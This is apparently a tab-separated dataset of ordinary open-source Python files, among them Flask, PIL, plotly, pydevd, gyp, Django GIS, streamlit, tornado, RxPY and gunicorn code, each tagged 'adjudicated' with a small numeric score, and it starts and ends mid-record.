alarm_severity=AlarmEventSeverity.CRITICAL)<<NEWL>>        self._onu_id = onu_id<<NEWL>>        self._intf_id = intf_id<<NEWL>><<NEWL>>    def get_context_data(self):<<NEWL>>        return {'onu-id': self._onu_id,<<NEWL>>                'onu-intf-id': self._intf_id}"
455	adjudicated	3	"# Copyright 2016 Google LLC.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>from flask import Flask<<NEWL>>import requests<<NEWL>><<NEWL>>import services_config<<NEWL>><<NEWL>>app = Flask(__name__)<<NEWL>>services_config.init_app(app)<<NEWL>><<NEWL>><<NEWL>>@app.route('/')<<NEWL>>def root():<<NEWL>>    """"""Gets index.html from the static file server""""""<<NEWL>>    res = requests.get(app.config['SERVICE_MAP']['static'])<<NEWL>>    return res.content<<NEWL>><<NEWL>><<NEWL>>@app.route('/hello/<service>')<<NEWL>>def say_hello(service):<<NEWL>>    """"""Recieves requests from buttons on the front end and resopnds<<NEWL>>    or sends request to the static file server""""""<<NEWL>>    # If 'gateway' is specified return immediate<<NEWL>>    if service == 'gateway':<<NEWL>>        return 'Gateway says hello'<<NEWL>><<NEWL>>    # Otherwise send request to service indicated by URL param<<NEWL>>    responses = []<<NEWL>>    url = app.config['SERVICE_MAP'][service]<<NEWL>>    res = requests.get(url + '/hello')<<NEWL>>    responses.append(res.content)<<NEWL>>    return '\n'.encode().join(responses)<<NEWL>><<NEWL>><<NEWL>>@app.route('/<path>')<<NEWL>>def static_file(path):<<NEWL>>    """"""Gets static files required by index.html to static file server""""""<<NEWL>>    url = app.config['SERVICE_MAP']['static']<<NEWL>>    res = requests.get(url + '/' + path)<<NEWL>>    return res.content, 200, {'Content-Type': res.headers['Content-Type']}<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    # This is used when running locally. Gunicorn is used to run the<<NEWL>>    # application on Google App Engine. See entrypoint in app.yaml.<<NEWL>>    app.run(host='127.0.0.1', port=8000, debug=True)"
515	adjudicated	0	"import sys<<NEWL>>from typing import TYPE_CHECKING<<NEWL>><<NEWL>>if sys.version_info < (3, 7) or TYPE_CHECKING:<<NEWL>>    from ._visible import VisibleValidator<<NEWL>>    from ._type import TypeValidator<<NEWL>>    from ._templateitemname import TemplateitemnameValidator<<NEWL>>    from ._symbol import SymbolValidator<<NEWL>>    from ._sourcetype import SourcetypeValidator<<NEWL>>    from ._sourcelayer import SourcelayerValidator<<NEWL>>    from ._sourceattribution import SourceattributionValidator<<NEWL>>    from ._source import SourceValidator<<NEWL>>    from ._opacity import OpacityValidator<<NEWL>>    from ._name import NameValidator<<NEWL>>    from ._minzoom import MinzoomValidator<<NEWL>>    from ._maxzoom import MaxzoomValidator<<NEWL>>    from ._line import LineValidator<<NEWL>>    from ._fill import FillValidator<<NEWL>>    from ._coordinates import CoordinatesValidator<<NEWL>>    from ._color import ColorValidator<<NEWL>>    from ._circle import CircleValidator<<NEWL>>    from ._below import BelowValidator<<NEWL>>else:<<NEWL>>    from _plotly_utils.importers import relative_import<<NEWL>><<NEWL>>    __all__, __getattr__, __dir__ = relative_import(<<NEWL>>        __name__,<<NEWL>>        [],<<NEWL>>        [<<NEWL>>            ""._visible.VisibleValidator"",<<NEWL>>            ""._type.TypeValidator"",<<NEWL>>            ""._templateitemname.TemplateitemnameValidator"",<<NEWL>>            ""._symbol.SymbolValidator"",<<NEWL>>            ""._sourcetype.SourcetypeValidator"",<<NEWL>>            ""._sourcelayer.SourcelayerValidator"",<<NEWL>>            ""._sourceattribution.SourceattributionValidator"",<<NEWL>>            ""._source.SourceValidator"",<<NEWL>>            ""._opacity.OpacityValidator"",<<NEWL>>            ""._name.NameValidator"",<<NEWL>>            ""._minzoom.MinzoomValidator"",<<NEWL>>            ""._maxzoom.MaxzoomValidator"",<<NEWL>>            ""._line.LineValidator"",<<NEWL>>            ""._fill.FillValidator"",<<NEWL>>            ""._coordinates.CoordinatesValidator"",<<NEWL>>            ""._color.ColorValidator"",<<NEWL>>            ""._circle.CircleValidator"",<<NEWL>>            ""._below.BelowValidator"",<<NEWL>>        ],<<NEWL>>    )"
404	adjudicated	3	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># sequence support classes<<NEWL>>#<<NEWL>># history:<<NEWL>># 1997-02-20 fl     Created<<NEWL>>#<<NEWL>># Copyright (c) 1997 by Secret Labs AB.<<NEWL>># Copyright (c) 1997 by Fredrik Lundh.<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>>##<<NEWL>><<NEWL>><<NEWL>>class Iterator:<<NEWL>>    """"""<<NEWL>>    This class implements an iterator object that can be used to loop<<NEWL>>    over an image sequence.<<NEWL>><<NEWL>>    You can use the ``[]`` operator to access elements by index. This operator<<NEWL>>    will raise an :py:exc:`IndexError` if you try to access a nonexistent<<NEWL>>    frame.<<NEWL>><<NEWL>>    :param im: An image object.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, im):<<NEWL>>        if not hasattr(im, ""seek""):<<NEWL>>            msg = ""im must have seek method""<<NEWL>>            raise AttributeError(msg)<<NEWL>>        self.im = im<<NEWL>>        self.position = getattr(self.im, ""_min_frame"", 0)<<NEWL>><<NEWL>>    def __getitem__(self, ix):<<NEWL>>        try:<<NEWL>>            self.im.seek(ix)<<NEWL>>            return self.im<<NEWL>>        except EOFError as e:<<NEWL>>            raise IndexError from e  # end of sequence<<NEWL>><<NEWL>>    def __iter__(self):<<NEWL>>        return self<<NEWL>><<NEWL>>    def __next__(self):<<NEWL>>        try:<<NEWL>>            self.im.seek(self.position)<<NEWL>>            self.position += 1<<NEWL>>            return self.im<<NEWL>>        except EOFError as e:<<NEWL>>            raise StopIteration from e<<NEWL>><<NEWL>><<NEWL>>def all_frames(im, func=None):<<NEWL>>    """"""<<NEWL>>    Applies a given function to all frames in an image or a list of images.<<NEWL>>    The frames are returned as a list of separate images.<<NEWL>><<NEWL>>    :param im: An image, or a list of images.<<NEWL>>    :param func: The function to apply to all of the image frames.<<NEWL>>    :returns: A list of images.<<NEWL>>    """"""<<NEWL>>    if not isinstance(im, list):<<NEWL>>        im = [im]<<NEWL>><<NEWL>>    ims = []<<NEWL>>    for imSequence in im:<<NEWL>>        current = imSequence.tell()<<NEWL>><<NEWL>>        ims += [im_frame.copy() for im_frame in Iterator(imSequence)]<<NEWL>><<NEWL>>        imSequence.seek(current)<<NEWL>>    return [func(im) for im in ims] if func else ims"
492	adjudicated	1	"#<<NEWL>># download_mks_assets.py<<NEWL>># Added by HAS_TFT_LVGL_UI to download assets from Makerbase repo<<NEWL>>#<<NEWL>>import pioutil<<NEWL>>if pioutil.is_pio_build():<<NEWL>>    Import(""env"")<<NEWL>>    import requests,zipfile,tempfile,shutil<<NEWL>>    from pathlib import Path<<NEWL>><<NEWL>>    url = ""https://github.com/makerbase-mks/Mks-Robin-Nano-Marlin2.0-Firmware/archive/0263cdaccf.zip""<<NEWL>>    deps_path = Path(env.Dictionary(""PROJECT_LIBDEPS_DIR""))<<NEWL>>    zip_path = deps_path / ""mks-assets.zip""<<NEWL>>    assets_path = Path(env.Dictionary(""PROJECT_BUILD_DIR""), env.Dictionary(""PIOENV""), ""assets"")<<NEWL>><<NEWL>>    def download_mks_assets():<<NEWL>>        print(""Downloading MKS Assets"")<<NEWL>>        r = requests.get(url, stream=True)<<NEWL>>        # the user may have a very clean workspace,<<NEWL>>        # so create the PROJECT_LIBDEPS_DIR directory if not exits<<NEWL>>        if not deps_path.exists():<<NEWL>>            deps_path.mkdir()<<NEWL>>        with zip_path.open('wb') as fd:<<NEWL>>            for chunk in r.iter_content(chunk_size=128):<<NEWL>>                fd.write(chunk)<<NEWL>><<NEWL>>    def copy_mks_assets():<<NEWL>>        print(""Copying MKS Assets"")<<NEWL>>        output_path = Path(tempfile.mkdtemp())<<NEWL>>        zip_obj = zipfile.ZipFile(zip_path, 'r')<<NEWL>>        zip_obj.extractall(output_path)<<NEWL>>        zip_obj.close()<<NEWL>>        if assets_path.exists() and not assets_path.is_dir():<<NEWL>>            assets_path.unlink()<<NEWL>>        if not assets_path.exists():<<NEWL>>            assets_path.mkdir()<<NEWL>>        base_path = ''<<NEWL>>        for filename in output_path.iterdir():<<NEWL>>            base_path = filename<<NEWL>>        fw_path = (output_path / base_path / 'Firmware')<<NEWL>>        font_path = fw_path / 'mks_font'<<NEWL>>        for filename in font_path.iterdir():<<NEWL>>            shutil.copy(font_path / filename, assets_path)<<NEWL>>        pic_path = fw_path / 'mks_pic'<<NEWL>>        for filename in pic_path.iterdir():<<NEWL>>            shutil.copy(pic_path / filename, assets_path)<<NEWL>>        shutil.rmtree(output_path, ignore_errors=True)<<NEWL>><<NEWL>>    if not zip_path.exists():<<NEWL>>        download_mks_assets()<<NEWL>><<NEWL>>    if not assets_path.exists():<<NEWL>>        copy_mks_assets()"
430	adjudicated	4	"import os<<NEWL>><<NEWL>>from _pydev_bundle import pydev_log<<NEWL>>from _pydevd_bundle.pydevd_trace_dispatch import USING_CYTHON<<NEWL>>from _pydevd_bundle.pydevd_constants import USE_CYTHON_FLAG, ENV_FALSE_LOWER_VALUES, \<<NEWL>>    ENV_TRUE_LOWER_VALUES, IS_PY36_OR_GREATER, IS_PY38_OR_GREATER, SUPPORT_GEVENT, IS_PYTHON_STACKLESS, \<<NEWL>>    PYDEVD_USE_FRAME_EVAL, PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING<<NEWL>><<NEWL>>frame_eval_func = None<<NEWL>>stop_frame_eval = None<<NEWL>>dummy_trace_dispatch = None<<NEWL>>clear_thread_local_info = None<<NEWL>><<NEWL>># ""NO"" means we should not use frame evaluation, 'YES' we should use it (and fail if not there) and unspecified uses if possible.<<NEWL>>if (<<NEWL>>        PYDEVD_USE_FRAME_EVAL in ENV_FALSE_LOWER_VALUES or<<NEWL>>        USE_CYTHON_FLAG in ENV_FALSE_LOWER_VALUES or<<NEWL>>        not USING_CYTHON or<<NEWL>><<NEWL>>        # Frame eval mode does not work with ipython compatible debugging (this happens because the<<NEWL>>        # way that frame eval works is run untraced and set tracing only for the frames with<<NEWL>>        # breakpoints, but ipython compatible debugging creates separate frames for what's logically<<NEWL>>        # the same frame).<<NEWL>>        PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING<<NEWL>>    ):<<NEWL>>    USING_FRAME_EVAL = False<<NEWL>><<NEWL>>elif SUPPORT_GEVENT or (IS_PYTHON_STACKLESS and not IS_PY38_OR_GREATER):<<NEWL>>    USING_FRAME_EVAL = False<<NEWL>>    # i.e gevent and frame eval mode don't get along very well.<<NEWL>>    # https://github.com/microsoft/debugpy/issues/189<<NEWL>>    # Same problem with Stackless.<<NEWL>>    # https://github.com/stackless-dev/stackless/issues/240<<NEWL>><<NEWL>>elif PYDEVD_USE_FRAME_EVAL in ENV_TRUE_LOWER_VALUES:<<NEWL>>    # Fail if unable to use<<NEWL>>    from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info<<NEWL>>    USING_FRAME_EVAL = True<<NEWL>><<NEWL>>else:<<NEWL>>    USING_FRAME_EVAL = False<<NEWL>>    # Try to use if possible<<NEWL>>    if IS_PY36_OR_GREATER:<<NEWL>>        try:<<NEWL>>            from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info<<NEWL>>            USING_FRAME_EVAL = True<<NEWL>>        except ImportError:<<NEWL>>            pydev_log.show_compile_cython_command_line()"
461	adjudicated	1	"#!/usr/bin/env python3<<NEWL>><<NEWL>># Copyright (c) 2012 Google Inc. All rights reserved.<<NEWL>># Use of this source code is governed by a BSD-style license that can be<<NEWL>># found in the LICENSE file.<<NEWL>><<NEWL>>"""""" Unit tests for the ninja.py file. """"""<<NEWL>><<NEWL>>import sys<<NEWL>>import unittest<<NEWL>><<NEWL>>import gyp.generator.ninja as ninja<<NEWL>><<NEWL>><<NEWL>>class TestPrefixesAndSuffixes(unittest.TestCase):<<NEWL>>    def test_BinaryNamesWindows(self):<<NEWL>>        # These cannot run on non-Windows as they require a VS installation to<<NEWL>>        # correctly handle variable expansion.<<NEWL>>        if sys.platform.startswith(""win""):<<NEWL>>            writer = ninja.NinjaWriter(<<NEWL>>                ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""win""<<NEWL>>            )<<NEWL>>            spec = {""target_name"": ""wee""}<<NEWL>>            self.assertTrue(<<NEWL>>                writer.ComputeOutputFileName(spec, ""executable"").endswith("".exe"")<<NEWL>>            )<<NEWL>>            self.assertTrue(<<NEWL>>                writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".dll"")<<NEWL>>            )<<NEWL>>            self.assertTrue(<<NEWL>>                writer.ComputeOutputFileName(spec, ""static_library"").endswith("".lib"")<<NEWL>>            )<<NEWL>><<NEWL>>    def test_BinaryNamesLinux(self):<<NEWL>>        writer = ninja.NinjaWriter(<<NEWL>>            ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""linux""<<NEWL>>        )<<NEWL>>        spec = {""target_name"": ""wee""}<<NEWL>>        self.assertTrue(""."" not in writer.ComputeOutputFileName(spec, ""executable""))<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""shared_library"").startswith(""lib"")<<NEWL>>        )<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""static_library"").startswith(""lib"")<<NEWL>>        )<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".so"")<<NEWL>>        )<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""static_library"").endswith("".a"")<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    unittest.main()"
501	adjudicated	3	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2019 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>>""""""<<NEWL>>command line application and sample code for destroying a secret version.<<NEWL>>""""""<<NEWL>><<NEWL>>import argparse<<NEWL>><<NEWL>><<NEWL>># [START secretmanager_destroy_secret_version]<<NEWL>>def destroy_secret_version(project_id, secret_id, version_id):<<NEWL>>    """"""<<NEWL>>    Destroy the given secret version, making the payload irrecoverable. Other<<NEWL>>    secrets versions are unaffected.<<NEWL>>    """"""<<NEWL>><<NEWL>>    # Import the Secret Manager client library.<<NEWL>>    from google.cloud import secretmanager<<NEWL>><<NEWL>>    # Create the Secret Manager client.<<NEWL>>    client = secretmanager.SecretManagerServiceClient()<<NEWL>><<NEWL>>    # Build the resource name of the secret version<<NEWL>>    name = f""projects/{project_id}/secrets/{secret_id}/versions/{version_id}""<<NEWL>><<NEWL>>    # Destroy the secret version.<<NEWL>>    response = client.destroy_secret_version(request={""name"": name})<<NEWL>><<NEWL>>    print(""Destroyed secret version: {}"".format(response.name))<<NEWL>>    # [END secretmanager_destroy_secret_version]<<NEWL>><<NEWL>>    return response<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    parser = argparse.ArgumentParser(<<NEWL>>        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter<<NEWL>>    )<<NEWL>>    parser.add_argument(""project_id"", help=""id of the GCP project"")<<NEWL>>    parser.add_argument(""secret_id"", help=""id of the secret from which to act"")<<NEWL>>    parser.add_argument(""version_id"", help=""id of the version to destroy"")<<NEWL>>    args = parser.parse_args()<<NEWL>><<NEWL>>    destroy_secret_version(args.project_id, args.secret_id, args.version_id)"
441	adjudicated	4	"""""""<<NEWL>>PostGIS to GDAL conversion constant definitions<<NEWL>>""""""<<NEWL>># Lookup to convert pixel type values from GDAL to PostGIS<<NEWL>>GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]<<NEWL>><<NEWL>># Lookup to convert pixel type values from PostGIS to GDAL<<NEWL>>POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]<<NEWL>><<NEWL>># Struct pack structure for raster header, the raster header has the<<NEWL>># following structure:<<NEWL>>#<<NEWL>># Endianness, PostGIS raster version, number of bands, scale, origin,<<NEWL>># skew, srid, width, and height.<<NEWL>>#<<NEWL>># Scale, origin, and skew have x and y values. PostGIS currently uses<<NEWL>># a fixed endianness (1) and there is only one version (0).<<NEWL>>POSTGIS_HEADER_STRUCTURE = ""B H H d d d d d d i H H""<<NEWL>><<NEWL>># Lookup values to convert GDAL pixel types to struct characters. This is<<NEWL>># used to pack and unpack the pixel values of PostGIS raster bands.<<NEWL>>GDAL_TO_STRUCT = [<<NEWL>>    None,<<NEWL>>    ""B"",<<NEWL>>    ""H"",<<NEWL>>    ""h"",<<NEWL>>    ""L"",<<NEWL>>    ""l"",<<NEWL>>    ""f"",<<NEWL>>    ""d"",<<NEWL>>    None,<<NEWL>>    None,<<NEWL>>    None,<<NEWL>>    None,<<NEWL>>]<<NEWL>><<NEWL>># Size of the packed value in bytes for different numerical types.<<NEWL>># This is needed to cut chunks of band data out of PostGIS raster strings<<NEWL>># when decomposing them into GDALRasters.<<NEWL>># See https://docs.python.org/library/struct.html#format-characters<<NEWL>>STRUCT_SIZE = {<<NEWL>>    ""b"": 1,  # Signed char<<NEWL>>    ""B"": 1,  # Unsigned char<<NEWL>>    ""?"": 1,  # _Bool<<NEWL>>    ""h"": 2,  # Short<<NEWL>>    ""H"": 2,  # Unsigned short<<NEWL>>    ""i"": 4,  # Integer<<NEWL>>    ""I"": 4,  # Unsigned Integer<<NEWL>>    ""l"": 4,  # Long<<NEWL>>    ""L"": 4,  # Unsigned Long<<NEWL>>    ""f"": 4,  # Float<<NEWL>>    ""d"": 8,  # Double<<NEWL>>}<<NEWL>><<NEWL>># Pixel type specifies type of pixel values in a band. Storage flag specifies<<NEWL>># whether the band data is stored as part of the datum or is to be found on the<<NEWL>># server's filesystem. There are currently 11 supported pixel value types, so 4<<NEWL>># bits are enough to account for all. Reserve the upper 4 bits for generic<<NEWL>># flags. See<<NEWL>># https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag<<NEWL>>BANDTYPE_PIXTYPE_MASK = 0x0F<<NEWL>>BANDTYPE_FLAG_HASNODATA = 1 << 6"
410	adjudicated	1	"# -*- coding: utf-8 -*-<<NEWL>># Generated by the protocol buffer compiler.  DO NOT EDIT!<<NEWL>># source: streamlit/proto/Spinner.proto<<NEWL>><<NEWL>>from google.protobuf import descriptor as _descriptor<<NEWL>>from google.protobuf import message as _message<<NEWL>>from google.protobuf import reflection as _reflection<<NEWL>>from google.protobuf import symbol_database as _symbol_database<<NEWL>># @@protoc_insertion_point(imports)<<NEWL>><<NEWL>>_sym_db = _symbol_database.Default()<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>DESCRIPTOR = _descriptor.FileDescriptor(<<NEWL>>  name='streamlit/proto/Spinner.proto',<<NEWL>>  package='',<<NEWL>>  syntax='proto3',<<NEWL>>  serialized_options=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  serialized_pb=b'\n\x1dstreamlit/proto/Spinner.proto\""\x17\n\x07Spinner\x12\x0c\n\x04text\x18\x01 \x01(\tb\x06proto3'<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>_SPINNER = _descriptor.Descriptor(<<NEWL>>  name='Spinner',<<NEWL>>  full_name='Spinner',<<NEWL>>  filename=None,<<NEWL>>  file=DESCRIPTOR,<<NEWL>>  containing_type=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  fields=[<<NEWL>>    _descriptor.FieldDescriptor(<<NEWL>>      name='text', full_name='Spinner.text', index=0,<<NEWL>>      number=1, type=9, cpp_type=9, label=1,<<NEWL>>      has_default_value=False, default_value=b"""".decode('utf-8'),<<NEWL>>      message_type=None, enum_type=None, containing_type=None,<<NEWL>>      is_extension=False, extension_scope=None,<<NEWL>>      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),<<NEWL>>  ],<<NEWL>>  extensions=[<<NEWL>>  ],<<NEWL>>  nested_types=[],<<NEWL>>  enum_types=[<<NEWL>>  ],<<NEWL>>  serialized_options=None,<<NEWL>>  is_extendable=False,<<NEWL>>  syntax='proto3',<<NEWL>>  extension_ranges=[],<<NEWL>>  oneofs=[<<NEWL>>  ],<<NEWL>>  serialized_start=33,<<NEWL>>  serialized_end=56,<<NEWL>>)<<NEWL>><<NEWL>>DESCRIPTOR.message_types_by_name['Spinner'] = _SPINNER<<NEWL>>_sym_db.RegisterFileDescriptor(DESCRIPTOR)<<NEWL>><<NEWL>>Spinner = _reflection.GeneratedProtocolMessageType('Spinner', (_message.Message,), {<<NEWL>>  'DESCRIPTOR' : _SPINNER,<<NEWL>>  '__module__' : 'streamlit.proto.Spinner_pb2'<<NEWL>>  # @@protoc_insertion_point(class_scope:Spinner)<<NEWL>>  })<<NEWL>>_sym_db.RegisterMessage(Spinner)<<NEWL>><<NEWL>><<NEWL>># @@protoc_insertion_point(module_scope)"
424	adjudicated	1	"""""""Test markdown rendering""""""<<NEWL>><<NEWL>><<NEWL>>from nbformat.v4 import new_markdown_cell<<NEWL>><<NEWL>>from .utils import EDITOR_PAGE<<NEWL>><<NEWL>><<NEWL>>def get_rendered_contents(nb):<<NEWL>>    # TODO: Encapsulate element access/refactor so we're not accessing playwright element objects<<NEWL>>    cl = [""text_cell"", ""render""]<<NEWL>>    rendered_cells = [cell.locate("".text_cell_render"")<<NEWL>>                      for cell in nb.cells<<NEWL>>                      if all([c in cell.get_attribute(""class"") for c in cl])]<<NEWL>>    return [x.get_inner_html().strip()<<NEWL>>            for x in rendered_cells<<NEWL>>            if x is not None]<<NEWL>><<NEWL>><<NEWL>>def test_markdown_cell(prefill_notebook):<<NEWL>>    notebook_frontend = prefill_notebook([new_markdown_cell(md) for md in [<<NEWL>>        '# Foo', '**Bar**', '*Baz*', '```\nx = 1\n```', '```aaaa\nx = 1\n```',<<NEWL>>        '```python\ns = ""$""\nt = ""$""\n```'<<NEWL>>    ]])<<NEWL>><<NEWL>>    assert get_rendered_contents(notebook_frontend) == [<<NEWL>>        '<h1 id=""Foo"">Foo<a class=""anchor-link"" href=""#Foo"">Â¶</a></h1>',<<NEWL>>        '<p><strong>Bar</strong></p>',<<NEWL>>        '<p><em>Baz</em></p>',<<NEWL>>        '<pre><code>x = 1</code></pre>',<<NEWL>>        '<pre><code class=""cm-s-ipython language-aaaa"">x = 1</code></pre>',<<NEWL>>        '<pre><code class=""cm-s-ipython language-python"">' +<<NEWL>>        '<span class=""cm-variable"">s</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span>\n' +<<NEWL>>        '<span class=""cm-variable"">t</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span></code></pre>'<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>def test_markdown_headings(notebook_frontend):<<NEWL>>    for i in [1, 2, 3, 4, 5, 6, 2, 1]:<<NEWL>>        notebook_frontend.add_markdown_cell()<<NEWL>>        cell_text = notebook_frontend.evaluate(f""""""<<NEWL>>            var cell = IPython.notebook.get_cell(1);<<NEWL>>            cell.set_heading_level({i});<<NEWL>>            cell.get_text();<<NEWL>>        """""", page=EDITOR_PAGE)<<NEWL>>        assert notebook_frontend.get_cell_contents(1) == ""#"" * i + "" ""<<NEWL>>        notebook_frontend.delete_cell(1)"
475	adjudicated	1	from rx.core import ObservableBase, Observer, AnonymousObserver, Disposable<<NEWL>>from rx.disposables import CompositeDisposable<<NEWL>><<NEWL>>from .subscription import Subscription<<NEWL>>from .reactive_assert import AssertList<<NEWL>><<NEWL>><<NEWL>>class ColdObservable(ObservableBase):<<NEWL>>    def __init__(self, scheduler, messages):<<NEWL>>        super(ColdObservable, self).__init__()<<NEWL>><<NEWL>>        self.scheduler = scheduler<<NEWL>>        self.messages = messages<<NEWL>>        self.subscriptions = AssertList()<<NEWL>><<NEWL>>    def subscribe(self, on_next=None, on_error=None, on_completed=None, observer=None):<<NEWL>>        # Be forgiving and accept an un-named observer as first parameter<<NEWL>>        if isinstance(on_next, Observer):<<NEWL>>            observer = on_next<<NEWL>>        elif not observer:<<NEWL>>            observer = AnonymousObserver(on_next, on_error, on_completed)<<NEWL>><<NEWL>>        return self._subscribe_core(observer)<<NEWL>><<NEWL>>    def _subscribe_core(self, observer):<<NEWL>>        clock = self.scheduler.to_relative(self.scheduler.now)<<NEWL>>        self.subscriptions.append(Subscription(clock))<<NEWL>>        index = len(self.subscriptions) - 1<<NEWL>>        disposable = CompositeDisposable()<<NEWL>><<NEWL>>        def get_action(notification):<<NEWL>>            def action(scheduler, state):<<NEWL>>                notification.accept(observer)<<NEWL>>                return Disposable.empty()<<NEWL>>            return action<<NEWL>><<NEWL>>        for message in self.messages:<<NEWL>>            notification = message.value<<NEWL>><<NEWL>>            # Don't make closures within a loop<<NEWL>>            action = get_action(notification)<<NEWL>>            disposable.add(self.scheduler.schedule_relative(message.time, action))<<NEWL>><<NEWL>>        def dispose():<<NEWL>>            start = self.subscriptions[index].subscribe<<NEWL>>            end = self.scheduler.to_relative(self.scheduler.now)<<NEWL>>            self.subscriptions[index] = Subscription(start, end)<<NEWL>>            disposable.dispose()<<NEWL>><<NEWL>>        return Disposable.create(dispose)
486	adjudicated	1	"import socket<<NEWL>>import typing<<NEWL>><<NEWL>>from tornado.http1connection import HTTP1Connection<<NEWL>>from tornado.httputil import HTTPMessageDelegate<<NEWL>>from tornado.iostream import IOStream<<NEWL>>from tornado.locks import Event<<NEWL>>from tornado.netutil import add_accept_handler<<NEWL>>from tornado.testing import AsyncTestCase, bind_unused_port, gen_test<<NEWL>><<NEWL>><<NEWL>>class HTTP1ConnectionTest(AsyncTestCase):<<NEWL>>    code = None  # type: typing.Optional[int]<<NEWL>><<NEWL>>    def setUp(self):<<NEWL>>        super().setUp()<<NEWL>>        self.asyncSetUp()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def asyncSetUp(self):<<NEWL>>        listener, port = bind_unused_port()<<NEWL>>        event = Event()<<NEWL>><<NEWL>>        def accept_callback(conn, addr):<<NEWL>>            self.server_stream = IOStream(conn)<<NEWL>>            self.addCleanup(self.server_stream.close)<<NEWL>>            event.set()<<NEWL>><<NEWL>>        add_accept_handler(listener, accept_callback)<<NEWL>>        self.client_stream = IOStream(socket.socket())<<NEWL>>        self.addCleanup(self.client_stream.close)<<NEWL>>        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]<<NEWL>>        self.io_loop.remove_handler(listener)<<NEWL>>        listener.close()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def test_http10_no_content_length(self):<<NEWL>>        # Regression test for a bug in which can_keep_alive would crash<<NEWL>>        # for an HTTP/1.0 (not 1.1) response with no content-length.<<NEWL>>        conn = HTTP1Connection(self.client_stream, True)<<NEWL>>        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")<<NEWL>>        self.server_stream.close()<<NEWL>><<NEWL>>        event = Event()<<NEWL>>        test = self<<NEWL>>        body = []<<NEWL>><<NEWL>>        class Delegate(HTTPMessageDelegate):<<NEWL>>            def headers_received(self, start_line, headers):<<NEWL>>                test.code = start_line.code<<NEWL>><<NEWL>>            def data_received(self, data):<<NEWL>>                body.append(data)<<NEWL>><<NEWL>>            def finish(self):<<NEWL>>                event.set()<<NEWL>><<NEWL>>        yield conn.read_response(Delegate())<<NEWL>>        yield event.wait()<<NEWL>>        self.assertEqual(self.code, 200)<<NEWL>>        self.assertEqual(b"""".join(body), b""hello"")"
8	adjudicated	0	"# -*- coding: utf-8 -<<NEWL>>#<<NEWL>># This file is part of gunicorn released under the MIT license.<<NEWL>># See the NOTICE for more information.<<NEWL>><<NEWL>>import io<<NEWL>>import os<<NEWL>><<NEWL>># Classes that can undo reading data from<<NEWL>># a given type of data source.<<NEWL>><<NEWL>><<NEWL>>class Unreader(object):<<NEWL>>    def __init__(self):<<NEWL>>        self.buf = io.BytesIO()<<NEWL>><<NEWL>>    def chunk(self):<<NEWL>>        raise NotImplementedError()<<NEWL>><<NEWL>>    def read(self, size=None):<<NEWL>>        if size is not None and not isinstance(size, int):<<NEWL>>            raise TypeError(""size parameter must be an int or long."")<<NEWL>><<NEWL>>        if size is not None:<<NEWL>>            if size == 0:<<NEWL>>                return b""""<<NEWL>>            if size < 0:<<NEWL>>                size = None<<NEWL>><<NEWL>>        self.buf.seek(0, os.SEEK_END)<<NEWL>><<NEWL>>     